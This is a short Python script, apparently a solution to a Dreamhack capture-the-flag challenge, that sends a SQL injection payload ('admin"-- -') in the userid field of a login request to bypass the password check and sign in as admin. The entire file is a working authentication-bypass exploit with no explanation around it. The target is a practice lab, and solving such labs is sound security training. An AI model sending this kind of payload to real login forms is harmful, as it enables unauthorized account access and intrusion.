import requests

URL = "http://host1.dreamhack.games:21264"
LOGIN_URI = "/login"
PAYLOAD = 'admin"-- -'
DATA = {'userid': PAYLOAD, 'userpassword': ''}

resp = requests.post(URL + LOGIN_URI, data=DATA)
print(resp.text)